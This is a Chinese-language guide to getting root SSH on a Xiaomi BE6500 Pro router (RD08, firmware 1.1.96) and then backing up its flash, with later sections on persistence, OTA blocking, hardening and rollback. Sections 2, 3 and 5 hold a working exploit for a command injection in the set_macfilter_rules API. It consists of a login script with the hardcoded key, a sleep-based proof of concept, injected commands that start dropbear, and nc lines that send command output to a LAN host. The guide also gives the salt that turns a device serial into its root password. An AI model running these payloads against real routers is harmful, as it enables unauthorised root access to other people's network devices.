# Xiaomi BE6500 Pro (RD08) SSH 开启与固件备份

> 设备：小米路由器 BE6500 Pro　型号 **RD08**　固件 **1.1.96**
> 实测日期：2026-11-01　验证结果：**root shell 成功**

---

## 目录

- [0. 风险声明（先读）](#0-风险声明先读)
- [1. 设备信息](#1-设备信息)
- [2. 原理：命令注入漏洞](#2-原理命令注入漏洞)
- [3. 完整操作步骤](#3-完整操作步骤)
- [4. 固件备份](#4-固件备份)
- [5. 已知的坑](#5-已知的坑)
- [6. 持久化（重启不丢）](#6-持久化重启不丢)
- [7. 安全加固](#7-安全加固)
- [8. 关闭自动更新](#8-关闭自动更新)
- [9. 固件回退](#9-固件回退)
- [10. 恢复与撤销](#10-恢复与撤销)
- [11. 参考](#11-参考)

---

## 0. 风险声明（先读）

**本文档的所有命令都由你自行执行，风险自负。** 但需要明确：

| 操作 | 风险等级 | 说明 |
|---|---|---|
| 启动 dropbear（开 SSH） | **低** | 不写 NVRAM，重启即失效，可完全撤销 |
| 备份 flash | **极低** | 纯只读 `dd if=`，不向 flash 写任何字节 |
| 软固化（crontab） | 中 | 改动 `/data`，需注意不要覆盖出厂 crontab |
| 深度固化（改 bdata） | **高** | 需重启 3 次，操作不当可能变砖 |
| 刷 OpenWrt | **极高** | 需要 TTL 或专用工具，本文不涉及 |

**铁律：任何写操作之前，先完成第 4 节的 flash 备份。** 尤其 `mtd16`（ART 无线校准）和 `mtd21`（bdata，含 SN/MAC/设备密钥）——这两个分区一旦丢失，**任何官方固件都补不回来**，等于永久报废。

本文档只覆盖到「临时开 SSH + 备份」，**不包含深度固化**。

---

## 1. 设备信息

本次实测设备：

| 项 | 值 |
|---|---|
| 型号 | RD08 / `xiaomi.router.rd08` |
| 显示名 | Xiaomi 路由器 BE6500 Pro |
| 固件 | 1.1.96（编译于 2025-10-31） |
| 内核 | `Linux 5.4.213 aarch64` |
| 主机名 | `XiaoQiang` |
| 内存 | 863 MB |
| 根文件系统 | squashfs **只读**，35 MB |
| 可写分区 | `/data` (ubifs)、`/tmp` (tmpfs) |
| 加密模式 | `newEncryptMode = 1`（SHA-256） |

### 固件分区表（`cat /proc/mtd`）

```
dev:    size     erasesize  name
mtd0:  00180000  00020000  "0:SBL1"
mtd1:  00180000  00020000  "0:SBL1_1"
mtd2:  00100000  00020000  "0:MIBIB"
mtd3:  00080000  00020000  "0:BOOTCONFIG"
mtd4:  00080000  00020000  "0:BOOTCONFIG1"
mtd5:  00380000  00020000  "0:QSEE"
mtd6:  00380000  00020000  "0:QSEE_1"
mtd7:  00080000  00020000  "0:DEVCFG"
mtd8:  00080000  00020000  "0:DEVCFG_1"
mtd9:  00080000  00020000  "0:TME"
mtd10: 00080000  00020000  "0:TME_1"
mtd11: 00080000  00020000  "0:CDT"
mtd12: 00080000  00020000  "0:CDT_1"
mtd13: 00080000  00020000  "0:APPSBLENV"
mtd14: 00180000  00020000  "0:APPSBL"
mtd15: 00180000  00020000  "0:APPSBL_1"
mtd16: 00200000  00020000  "0:ART"            ← 无线校准，最重要
mtd17: 00080000  00020000  "0:TRAINING"
mtd18: 00040000  00020000  "0:LICENSE"
mtd19: 02d00000  00020000  "rootfs"
mtd20: 02d00000  00020000  "rootfs_1"
mtd21: 00080000  00020000  "bdata"            ← SN/MAC/密钥，最重要
mtd22: 00080000  00020000  "crash"
mtd23: 00080000  00020000  "crash_syslog"
mtd24: 02f40000  00020000  "overlay"          ← 动态写入
mtd25: 02000000  00020000  "central"
mtd26: 04000000  00020000  "docker"
mtd27: 00800000  00020000  "app_data"
mtd28: 0f800000  00020000  "other"            ← 动态写入
mtd29: 003b1bb6  0001f000  "kernel"
mtd30: 0231e000  0001f000  "ubi_rootfs"
mtd31: 00c1c000  0001f000  "cfg"
mtd32: 00c1c000  0001f000  "user"
mtd33: 00b62000  0001f000  "plugin"
mtd34: 02c71000  0001f000  "ubi_docker"
mtd35: 00725000  0001f000  "ubi_central"
mtd36: 0eaec000  0001f000  "data"
```

---

## 2. 原理：命令注入漏洞

### 2.1 漏洞位置

小米 Web 管理接口 `api/xqsystem/set_macfilter_rules` 的 `name` 参数存在命令注入。

```
POST /cgi-bin/luci/;stok=<TOKEN>/api/xqsystem/set_macfilter_rules
     mac=<合法MAC>&name=<载荷>&option=0
  │
  ├─ 控制器读 name：formvalue("name")            ← 无正则检查
  │    （旧接口 set_mac_filter 是 formvalue("name", nil, "?commonstr")，带正则）
  │
  ├─ XQSecureUtil.hackCheck 本该过滤 ` ; | $ & 和换行
  │    但 "name" 在 whitelist = { name=1, password=1, ssid=1, ... } 里
  │    → 直接 return true，一个字符都不查
  │
  ├─ XQFirewall.setMacFilter(mac, name, "0", "")
  │
  └─ os.execute("/usr/sbin/macfilter add black <mac> rulename=<载荷>")
        ↑ 无引号、无转义，以 root 执行
```

三层防护全部失效，各有各的原因：

| 层 | 本应做 | 实际 |
|---|---|---|
| `hackCheck` | 过滤危险字符 | `name` 在白名单，直接放行 |
| 控制器 | 校验参数 | 用了不带正则的 `formvalue` |
| `setMacFilter` | 转义后拼接 | 直接拼进 `os.execute` |

### 2.2 载荷限制

| 字符 | 可用 | 原因 |
|---|---|---|
| 换行 | ✅ | 白名单放行 |
| 反引号 | ✅ | 同上 |
| `$( )` | ✅ | 同上 |
| `\|` `&` | ✅ | 同上 |
| **`;`** | ❌ | 控制器按 `;` 拆分 mac/name，分号后内容丢失 |

其他必要条件：

- `option` 必须是 `0`（add）。`option=1`（del）且 MAC 不在表里会提前 return，不执行。
- `mac` 必须匹配 `^[0-9a-fA-F:;]+$` 且**不在现有过滤表中**（每次用随机 MAC 规避）。

### 2.3 root 密码从哪来

固件首次开机时 `etc/init.d/system` 执行：

```sh
set_user(){
    local inited=$(uci -q get xiaoqiang.common.INITTED)
    [ "$inited" != "YES" ] && {
        local init_pwd=`mkxqimage -I`          # ← 密码在这里生成
        (echo $init_pwd; sleep 1; echo $init_pwd) | passwd root
    }
}
```

`mkxqimage -I` 的算法是 `MD5(SN + 固定盐)` 取前 8 位，盐为：

```
6d2df50a-250f-4a30-a5e6-d44fb0960aa0
```

**这意味着 SN 等同于 root 密码。** 路由器底部的标签不要随便拍照外传。

---

## 3. 完整操作步骤

### 3.1 前置条件

- 与路由器在同一局域网，能打开管理页面
- Python 3
- 知道 **Web 管理密码**（不是 WiFi 密码，不是小米账号密码）
- 知道 **设备 SN**（底部标签，形如 `12345/A1B2C3D4E5F6`；也可从 `/api/xqsystem/init_info` 的 `id` 字段获得）

### 3.2 登录获取 stok

小米的登录密码算法（`newEncryptMode=1` 时为 SHA-256）：

```
nonce    = "0_" + deviceId + "_" + unix时间戳 + "_" + 随机整数
password = H(nonce + H(Web密码 + key))
```

其中 `key = a2ffa5c9be07488bbb04a3a47d3c5f6a`，`deviceId` 是本机 MAC。

```python
import hashlib, random, time, json, urllib.request, urllib.parse, http.cookiejar

KEY = 'a2ffa5c9be07488bbb04a3a47d3c5f6a'
MAC = open('/sys/class/net/ens18/address').read().strip()   # 改成你的网卡
PWD = '你的Web管理密码'
BASE = 'http://192.168.1.1'
sha = lambda s: hashlib.sha256(s.encode()).hexdigest()

nonce = '_'.join(['0', MAC, str(int(time.time())), str(random.randint(0, 9999))])
hashed = sha(nonce + sha(PWD + KEY))

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
data = urllib.parse.urlencode({
    'username': 'admin', 'password': hashed,
    'logtype': '2', 'nonce': nonce,
}).encode()
STOK = json.loads(op.open(
    urllib.request.Request(BASE + '/cgi-bin/luci/api/xqsystem/login', data=data), timeout=10
).read())['token']
print('stok =', STOK)
```

> ⚠️ 连续 4 次密码错误会被禁止继续尝试。先确认密码正确。

### 3.3 用 SN 计算 root 密码

```python
import hashlib
SN = '12345/A1B2C3D4E5F6'          # ← 换成你的 SN
SALT = '6d2df50a-250f-4a30-a5e6-d44fb0960aa0'
print(hashlib.md5((SN + SALT).encode()).hexdigest()[:8])
```

**登录前先本地验证**（不要拿路由器当试验田）：

```sh
# 先读路由器的 shadow（需已能执行命令），再本地复现
openssl passwd -1 -salt '<从shadow提取的salt>' '<算出的密码>'
```

两者输出一致则密码正确。

### 3.4 验证漏洞存在（只读，零痕迹）

用**计时法**，不需要抓包、不需要 root 权限：

```python
def call(data):
    url = f'{BASE}/cgi-bin/luci/;stok={STOK}/api/xqsystem/set_macfilter_rules'
    t0 = time.time()
    r = op.open(urllib.request.Request(url, data=data.encode()), timeout=40).read().decode()
    return round(time.time() - t0, 2), r

TESTMAC = '0A:11:22:33:44:99'

call(f'mac={TESTMAC}&name=&option=1&wan=')                    # 基线 ~0.3s
call(f'mac={TESTMAC}&name=normalname&option=0&wan=')          # 基线 ~0.5s
call(f'mac={TESTMAC}&name=&option=1&wan=')                    # 清理
t, r = call(f'mac={TESTMAC}&name=x%24(sleep%206)y&option=0&wan=')   # ← 应耗时 ~6.4s
call(f'mac={TESTMAC}&name=&option=1&wan=')                    # 清理
```

若第三条耗时 ≈ 6 秒，说明命令注入成立。

### 3.5 启动 dropbear

把 `$(sleep 6)` 换成真正的命令：

```sh
mkdir -p /etc/dropbear
rm -f /etc/dropbear/dropbear_rsa_host_key
dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key
/usr/sbin/dropbear -p 22
```

> **为什么要 `rm -f` 再生成？** 固件里的 hostkey 是 **0 字节占位文件**，而 `dropbear -R`（自动生成）遇到已存在文件不会覆盖，会拿空 key 启动失败。详见[坑 2](#坑-2hostkey-是-0-字节占位文件)。

> **为什么不用 telnetd？** 小米给 busybox 的 `telnetd` 打了补丁，稳定版下除非 `telnet_en=1` 否则拒绝启动，且闸门在**二进制内部**，改 init 脚本无效。dropbear 没有这个补丁。

验证：

```sh
nc -vz 192.168.1.1 22      # 应显示 succeeded
```

### 3.6 登录

```sh
ssh -o HostKeyAlgorithms=+ssh-rsa \
    -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    -o StrictHostKeyChecking=no \
    root@192.168.1.1
```

成功会看到 BusyBox 横幅，`id` 返回 `uid=0(root)`。

---

## 4. 固件备份

### 4.1 为什么必须备份

| 分区 | 内容 | 丢失后果 |
|---|---|---|
| **mtd16** | ART 无线校准 | 无线无法工作，**官方固件补不回来** |
| **mtd21** | bdata（SN/MAC/设备密钥） | 设备身份丢失，**永久报废** |
| mtd2 | MIBIB 分区表 | 无法正确划分 flash |
| mtd14/15 | APPSBL (uboot) | 无法引导 |

### 4.2 备份方法（本次实测采用）

**关键点：用 SSH 直接管道传输，不要用 busybox 的 `wget --post-file`。**

原因：busybox 的 `wget --post-file` 走 C 字符串，**遇到 `0x00` 就截断**。二进制分区会在第一个 NUL 处被切断，而且不含 NUL 的分区会完整通过，制造「通路正常」的假象。

本次采用的是纯 SSH 二进制通道：

```bash
#!/bin/bash
# fetch.sh —— 只读导出单个 mtd 分区
part=$1; name=$2
ssh root@192.168.1.1 "dd if=/dev/mtdblock${part} bs=65536 2>/dev/null" > "${name}.bin"
```

批量导出：

```bash
for spec in 0:SBL1 1:SBL1_1 2:MIBIB 3:BOOTCONFIG 4:BOOTCONFIG1 \
            5:QSEE 6:QSEE_1 7:DEVCFG 8:DEVCFG_1 9:TME 10:TME_1 \
            11:CDT 12:CDT_1 13:APPSBLENV 14:APPSBL 15:APPSBL_1 \
            16:ART 17:TRAINING 18:LICENSE 19:rootfs 20:rootfs_1 \
            21:bdata 22:crash 23:crash_syslog 24:overlay 25:central \
            26:docker 27:app_data 28:other 29:kernel; do
    p=${spec%%:*}; n=${spec##*:}
    ./fetch.sh $p "mtd${p}_${n}"
done
```

### 4.3 校验

```bash
# 路由器侧
ssh root@192.168.1.1 'for i in $(seq 0 29); do
  echo "$i $(dd if=/dev/mtdblock$i bs=65536 2>/dev/null | md5sum | cut -d" " -f1)"
done'

# 本地逐分区比对
while read idx rhash; do
    f=$(ls mtd${idx}_*.bin | head -1)
    lhash=$(md5sum "$f" | cut -d' ' -f1)
    [ "$lhash" = "$rhash" ] && echo "✓ mtd${idx}" || echo "✗ mtd${idx}"
done < router_md5.txt
```

**实测结果：30 个分区中 28 个稳定一致，`mtd24` 和 `mtd28` 持续变化。**

`mtd24`（overlay）和 `mtd28`（other）是**活跃写入的 UBI 数据分区**（Docker、日志、运行数据）。它们的 MD5 在路由器上连续两次采样就会变（实测 `2c211957` → `c81848a4` → `1d06081c`），任何快照都会瞬间过期。这不是传输问题。

对这类分区，反复重试直到本地与路由器**同时刻**一致即可（实测第 2 次命中）。

> **真正重要的是 mtd0–mtd23 和 mtd29，这些是静态的，必须 100% 吻合。**

### 4.4 本次备份产物

```
Xiaomi BE6500Pro SSH/
├── README.md                     本文档
└── firmware/                     30 个分区，共 516 MB
    ├── MD5SUMS.txt               校验清单
    ├── mtd16_ART.bin             ★ 无线校准（2 MB）
    ├── mtd21_bdata.bin           ★ SN/MAC/密钥（512 KB）
    ├── mtd19_rootfs.bin          rootfs A（45 MB）
    ├── mtd20_rootfs_1.bin        rootfs B（45 MB）
    ├── mtd28_other.bin           数据区（248 MB，动态）
    └── ...                       其余 24 个
```

---

## 5. 已知的坑

### 坑 1：`/root` 是只读的

```
/dev/mtdblock30 on / type squashfs (ro,noatime)
```

`mkdir -p /root/.ssh` 会**静默失败**，如果后面用 `&&` 串联，整条链会短路，导致 `authorized_keys` 根本不存在却看不出来。

`/etc` 是可写的（tmpfs），要放公钥往那儿放。

### 坑 2：hostkey 是 0 字节占位文件

固件里 `/etc/dropbear/dropbear_rsa_host_key` 存在但是空的。`dropbear -R` 遇到已存在文件**不会覆盖**，于是拿空 key 启动，直接失败。

**必须先删再生成：**

```sh
rm -f /etc/dropbear/dropbear_rsa_host_key
dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key
/usr/sbin/dropbear -p 22
```

### 坑 3：SSH 握手失败

```
Unable to negotiate with 192.168.1.1 port 22: no matching host key type found.
Their offer: ssh-rsa
```

路由器上 dropbear 是 `v2017.75`，**只有 SHA-1 的 `ssh-rsa`**，而 OpenSSH 8.8+ 默认禁用。看起来像被拒，其实是客户端不同意算法。

**解法：**

```sh
-o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa
```

写进 `~/.ssh/config` 更方便：

```
Host miwifi
    HostName 192.168.1.1
    User root
    HostKeyAlgorithms +ssh-rsa
    PubkeyAcceptedAlgorithms +ssh-rsa
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
    LogLevel QUIET
```

### 坑 4：命令回传看不到输出

通过注入执行命令时没有 stdout。这样写是错的：

```sh
cat /etc/passwd; echo MARKER; ls /root | nc 192.168.1.100 9999
```

**管道只作用于最后一条命令**，前面的输出全进了黑洞。正确写法是包成块：

```sh
{
  echo "=== MOUNT ==="
  mount | grep ' / '
  echo "=== DONE ==="
} | nc 192.168.1.100 9999
```

或写临时文件再 base64 回传（二进制安全）：

```sh
base64 /tmp/diag.txt | nc 192.168.1.100 9999
```

### 坑 5：非交互 SSH 登录

本机若没有 `sshpass` / `paramiko`，可用 `SSH_ASKPASS`：

```sh
#!/bin/sh
# askpass.sh
case "$1" in
  *assword*) echo '你的root密码' ;;
  *) echo '' ;;
esac
```

```sh
DISPLAY=:0 SSH_ASKPASS=/tmp/askpass.sh SSH_ASKPASS_REQUIRE=force \
setsid -w ssh -o PreferredAuthentications=password \
    -o NumberOfPasswordPrompts=1 -o StrictHostKeyChecking=no \
    root@192.168.1.1 'id'
```

`setsid` 用于彻底脱离终端，否则 OpenSSH 会改走 tty 提示。

### 坑 6：`;` 在载荷里不能用

控制器按 `;` 拆分 `mac`/`name`，分号后的内容会被丢弃。串联命令用 `&&` 或换行。

---

## 6. 持久化（重启不丢）

> ⚠️ 本节会让你改动 `/data` 并写入 crontab。**做之前请先完成第 4 节备份。**

### 6.1 为什么默认会丢

```
/dev/mtdblock30 on / type squashfs (ro,noatime)     ← 只读
ubi24:cfg       on /data type ubifs (rw,sync)       ← 可写，能持久
tmpfs           on /tmp                             ← 重启清空
```

`/etc` 在根文件系统上（tmpfs 层），**重启即失**。只有 `nvram` 和 `/data`（ubifs）能持久。`/etc/crontabs` 被 bind-mount 到 `/data/etc/crontabs`，所以写 crontab 能跨重启存活。

### 6.2 软固化脚本

在路由器 shell 里执行：

```sh
mkdir -p /data/ssh /etc/dropbear

# 把 hostkey 固化到 /data
[ -s /data/ssh/host_key ] || cp /etc/dropbear/dropbear_rsa_host_key /data/ssh/host_key 2>/dev/null
[ -s /data/ssh/host_key ] || dropbearkey -t rsa -f /data/ssh/host_key

cat > /data/ssh/boot.sh <<'BOOTEOF'
#!/bin/sh
mkdir -p /etc/dropbear
[ -s /etc/dropbear/dropbear_rsa_host_key ] || cp /data/ssh/host_key /etc/dropbear/dropbear_rsa_host_key
chmod 600 /etc/dropbear/dropbear_rsa_host_key
netstat -ltn 2>/dev/null | grep -q ':22 ' || /usr/sbin/dropbear -p 22
BOOTEOF

chmod 755 /data/ssh/boot.sh
```

### 6.3 追加 crontab（**不要覆盖**）

出厂 crontab 有 13 条任务（日志轮转、NTP 校时、温度保护等）。**直接 `echo > /etc/crontabs/root` 会全丢。**

先看现有内容：

```sh
cat /etc/crontabs/root
```

然后**追加**一行：

```sh
echo '* * * * * /data/ssh/boot.sh' >> /etc/crontabs/root
/etc/init.d/cron restart 2>/dev/null || /usr/sbin/crond -c /etc/crontabs -b
```

这样重启后最多一分钟，SSH 自动恢复。

### 6.4 撤销软固化

```sh
sed -i '/\/data\/ssh\/boot.sh/d' /etc/crontabs/root
/etc/init.d/cron restart
rm -rf /data/ssh
```

---

## 7. 安全加固

开启 SSH 后**务必**做这几件事，否则等于给自己开洞。

### 7.1 绑定到 LAN，不监听 WAN

默认 `dropbear -p 22` 会监听 `0.0.0.0`，**包括 WAN 口**。虽然小米防火墙默认会拦，但不要依赖它：

```sh
killall dropbear
/usr/sbin/dropbear -p 192.168.1.1:22
```

验证：

```sh
netstat -ltn | grep ':22'
# 应显示 192.168.1.1:22，而不是 0.0.0.0:22
```

### 7.2 检查防火墙确实在拦

```sh
iptables -L zone_wan_input -n -v
```

最后一条应该是 `zone_wan_src_REJECT`，且计数在增长。

### 7.3 换掉默认密码

```sh
passwd root          # 改 root 密码
```

Web 管理密码也建议更换——**它正是触发注入的前提**，泄露即等于 root。

### 7.4 保护 SN

`SN` 可直接推出 root 密码。不要拍照外传。

### 7.5 堵住 OTA（否则升级后 root 失效）

小米有两条升级通道，光关后台开关不够：

```sh
# 1. 确认自动升级已关（应输出 0）
uci get otapred.settings.auto
uci set otapred.settings.auto=0 && uci commit otapred

# 2. 去掉 crontab 里的 OTA 任务
grep otapredownload /etc/crontabs/root

# 3. 可选：DNS 层屏蔽 OTA 服务器
uci add_list dhcp.@dnsmasq[0].address='/bigota.miwifi.com/0.0.0.0'
uci commit dhcp && /etc/init.d/dnsmasq restart
```

> 第 3 步会让 `bigota.miwifi.com` 解析到 `0.0.0.0`。以后想主动升级需先撤销。

---

## 8. 关闭自动更新

> 本节是**实测操作记录**（2026-11-01 已在本机执行完毕）。

### 8.1 为什么光关后台开关没用

小米有**两条独立的升级通道**，Web 后台那个「自动更新」开关只关了第一条：

| 通道 | 位置 | 关掉后的效果 |
|---|---|---|
| Web/米家「自动更新」开关 | `otapred.settings.auto` | 只影响界面触发的升级 |
| **出厂 crontab 定时任务** | `1 3,4,5 * * * /usr/sbin/otapredownload` | 每天凌晨 3/4/5 点自动跑，**这条才是真正偷升级的** |

实测本机初始状态：

```
otapred.settings.enabled = 1
otapred.settings.auto    = 1      ← 自动更新开着
otapred.settings.time    = 4

/etc/crontabs/root 第 5 行：
1 3,4,5 * * * /usr/sbin/otapredownload >/dev/null 2>&1
```

### 8.2 第一步：关 UCI 开关

```sh
uci set otapred.settings.auto=0
uci commit otapred
uci get otapred.settings.auto      # 应输出 0
```

这一步相当于在管理页面里关掉「自动更新」，可以随时改回 `1` 恢复。

### 8.3 第二步：删除 crontab 里的 OTA 任务（关键）

```sh
# 先备份
cp /etc/crontabs/root /data/crontab.backup.$(date +%Y%m%d)

# 只删 OTA 那一行，其余任务保留
cp /etc/crontabs/root /tmp/cron.new
sed -i '/otapredownload/d' /tmp/cron.new

# 确认行数从 13 变成 12 再应用
wc -l < /tmp/cron.new
cp /tmp/cron.new /etc/crontabs/root
cp /tmp/cron.new /data/etc/crontabs/root     # 同步持久副本

# 重启 cron
/etc/init.d/cron restart
```

> ⚠️ **绝对不要**用 `echo > /etc/crontabs/root` 直接覆盖。出厂 crontab 有 13 条任务，包括日志轮转（`logrotate`）、NTP 校时（`ntpsetclock`）、温度保护、`run-parts` 周期任务等，覆盖后会一并丢失。

实测删除后保留的 12 条任务：

```
*/5 * * * * command -v sp_check.sh >/dev/null && sp_check.sh
*/2 * * * * command -v logrotate >/dev/null && logrotate /etc/logrotate.conf
*/15 * * * * /usr/sbin/ntpsetclock 60 log >/dev/null 2>&1
* * * * * /usr/sbin/startscene_crontab.lua `/bin/date "+%u %H:%M"`
*/3 * * * * /usr/sbin/mobile_accel.sh check >/dev/null 2>&1
0 3 * * * /usr/bin/downloadtool_run_safe.sh complete_record clear >/dev/null
0 */6 * * * command -v sec_cfg_bak.sh >/dev/null && sec_cfg_bak.sh
* * * * * run-parts -a 1min /etc/periodic
*/10 * * * * run-parts -a 10min /etc/periodic
3 * * * * run-parts -a hourly /etc/periodic
6 1 * * * run-parts -a daily /etc/periodic
```

### 8.4 第三步（可选）：DNS 层屏蔽

双保险，即使前两步被固件重置也拉不到固件：

```sh
uci add_list dhcp.@dnsmasq[0].address='/bigota.miwifi.com/0.0.0.0'
uci add_list dhcp.@dnsmasq[0].address='/cdn.cnbj1.fds.api.mi-img.com/0.0.0.0'
uci commit dhcp
/etc/init.d/dnsmasq restart
```

> 代价：以后想主动升级时要先撤销。
> 撤销：`uci del_list dhcp.@dnsmasq[0].address='/bigota.miwifi.com/0.0.0.0'` 后 `uci commit dhcp`。

### 8.5 验证

```sh
uci get otapred.settings.auto          # 0
grep -c otapredownload /etc/crontabs/root        # 0
grep -c otapredownload /data/etc/crontabs/root   # 0
ps | grep crond | grep -v grep         # 进程在跑
```

### 8.6 完全恢复自动更新

```sh
uci set otapred.settings.auto=1 && uci commit otapred
cp /data/crontab.backup.YYYYMMDD /etc/crontabs/root
cp /data/crontab.backup.YYYYMMDD /data/etc/crontabs/root
/etc/init.d/cron restart
```

---

## 9. 固件回退

> **好消息：这台机器是 A/B 双分区，回退是官方支持的，不需要拆机。**

### 9.1 为什么能回退

```sh
$ cat /proc/cmdline
ubi.mtd=rootfs_1 root=mtd:ubi_rootfs rootfstype=squashfs ...
```

`/proc/cmdline` 里的 `ubi.mtd=rootfs_1` 说明**当前从 mtd20（rootfs_1）启动**，而 **mtd19（rootfs）是另一个槽位**。UBI 卷映射也印证：

```
ubi0 -> mtd_num=20        ← 当前运行的根文件系统
ubi0_0 -> kernel
ubi0_1 -> ubi_rootfs
```

开机时 uboot 读 `bootargs` 决定从哪个槽启动，OTA 就是「写入另一个槽 → 改 bootargs → 重启」。这意味着：

- 升级失败或想反悔时，**切换回旧槽即可**
- 但注意：**升级后旧槽会被覆盖**。所以「靠切换槽位回退」只在刚升级完还没被下一轮覆盖时有效

### 9.2 最可靠的方案：用官方固件包重刷（推荐）

我**已经帮你把官方 1.1.96 固件下载到本地了**：

```
Xiaomi BE6500Pro SSH/official_firmware/
└── miwifi_rd08_firmware_708c2_1.1.96.bin    42,337,280 字节
    MD5: ca00edece4618f905ee43635292708c2
```

来源是小米官方 CDN，地址记录在路由器的 UCI 配置里：

```sh
uci get xiaoqiang.common.ROM_DOWNLOAD_URL
# https://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/rd08/miwifi_rd08_firmware_708c2_1.1.96.bin

uci get xiaoqiang.common.ROM_FULLSIZE
# 42337280     ← 与下载文件字节数完全一致
```

固件包格式为小米专有 `HDR1` 头，内含 `RD08` 与 `1.1.96` 标识，已验证。

**回退操作**（把固件传到路由器再刷）：

```sh
# 1. 传到路由器的 /tmp（tmpfs，不动 flash）
scp miwifi_rd08_firmware_708c2_1.1.96.bin root@192.168.1.1:/tmp/rom.bin

# 2. 先 dry-run 校验（关键！不会真的刷）
ssh root@192.168.1.1 '/sbin/sysupgrade --test /tmp/rom.bin'

# 3. 校验通过后正式刷
ssh root@192.168.1.1 '/sbin/sysupgrade /tmp/rom.bin'
```

> ⚠️ **`--test` 那步一定要先跑**。它会验证镜像完整性和配置，不通过就别刷。
> `sysupgrade` 默认保留配置（等价 `-c`）；要完全纯净重刷加 `-n`。

**更简单的办法：走官方 Web 后台。** 打开 http://miwifi.com → 系统状态 → 手动升级 → 选择这个 `.bin` 文件。小米自己的升级流程最稳妥，**推荐优先用这个**。

### 9.3 另一条路：小米官方修复工具（变砖时用）

如果已经刷坏、Web 后台进不去，但 uboot 还活着（`mtd14`/`mtd15` 完好）：

1. 下载 **MIWIFIRepairTool**（小米路由器修复工具）
2. 用同一份 `miwifi_rd08_firmware_708c2_1.1.96.bin`
3. 网线连接，按提示刷入

这就是为什么 `mtd14`/`mtd15`（APPSBL）一定要备份——它们活着就永远有救。

### 9.4 最后手段：dd 回写分区（最危险）

> ⚠️ **除非前面所有方法都失败，否则不要用。** 写错分区号直接变砖。

```sh
# 例：回写 rootfs_1（当前启动槽）。先确认编号！
scp mtd20_rootfs_1.bin root@192.168.1.1:/tmp/
ssh root@192.168.1.1 'dd if=/tmp/mtd20_rootfs_1.bin of=/dev/mtdblock20 bs=65536 conv=fsync'
```

回写前必须双向 `md5sum` 核对，回写后用 `/proc/mtd` 确认分区大小未变。

### 9.5 回退方案可靠性排序

| 方案 | 可靠性 | 前提 | 推荐度 |
|---|---|---|---|
| Web 后台上传官方固件 | 高 | 能进管理页 | ★★★★★ |
| `sysupgrade` 命令行 | 高 | 有 SSH | ★★★★ |
| MIWIFIRepairTool | 高 | uboot 完好 | ★★★★（救砖） |
| 切换 A/B 槽位 | 中 | 旧槽未被覆盖 | ★★★ |
| dd 回写分区 | 低 | 编号绝对正确 | ★（最后手段） |

### 9.6 重要限制

- **降级到更老版本（如 1.0.46）通常会被拒绝。** 小米升级流程有版本校验，`sysupgrade` 会提示镜像无效。需要的话只能用 MIWIFIRepairTool 强刷。
- **OTA 升级后 root 会丢失**（dropbear 配置在 `/etc`，属于新 rootfs）。这就是为什么第 8 节要关更新。
- **备份的分区镜像只对你这台机器有效。** 尤其 `mtd16`（ART）和 `mtd21`（bdata）含本机校准数据和 SN/MAC，**刷到别的机器上会出问题**。

---

## 10. 恢复与撤销

### 10.1 关闭 SSH（恢复原状）

如果不做第 6 节的固化，**重启路由器即可**，所有改动消失。

不重启也行：

```sh
killall dropbear
rm -f /etc/dropbear/dropbear_rsa_host_key
```

`ssh_en` 和 `telnet_en` 若未改过，NVRAM 保持原值 `0`。

### 10.2 从备份恢复分区（危险操作）

> ⚠️ **除非确定要刷回，否则不要执行。** 写错分区会直接变砖。

```sh
# 例：恢复 ART 分区（务必确认 mtd 编号！）
ssh root@192.168.1.1 'cat > /tmp/mtd16.bin' < mtd16_ART.bin
ssh root@192.168.1.1 'dd if=/tmp/mtd16.bin of=/dev/mtdblock16 bs=65536 conv=fsync'
```

恢复前用 `md5sum` 双向核对，恢复后用 `/proc/mtd` 确认大小。

### 10.3 急救：变砖后

若还能进 uboot（`mtd14`/`mtd15` 完好），可用小米官方 **MIWIFIRepairTool** + 对应固件救回。这就是为什么 `APPSBL` 分区一定要备份。

---

## 11. 参考

- [52pojie：小米 BE6500 Pro 通过 set_macfilter_rules 漏洞开启 SSH（针对 RD08 / 1.1.96）](https://www.52pojie.cn/forum.php?mod=viewthread&tid=2127776)
- [leafnsand/xiaomi-rp01-root：完整原理、脚本与四大排障](https://github.com/leafnsand/xiaomi-rp01-root)
- [c0j0s/Xiaomi-BE6500-Pro：折腾手册](https://github.com/c0j0s/Xiaomi-BE6500-Pro)
- [xmir-patcher：小米路由器 root 生态基础项目](https://github.com/openwrt-xiaomi/xmir-patcher)

### 免责声明

本文档仅供**设备所有者**管理与研究自己的设备使用。漏洞利用需要目标设备的 Web 管理密码，这本身是一道授权门槛。**请勿用于任何非你所有的设备。** 未经授权侵入他人计算机信息系统，在中国大陆可能触犯《刑法》第 285 条。

作者不对任何设备损坏、数据丢失、保修失效负责。
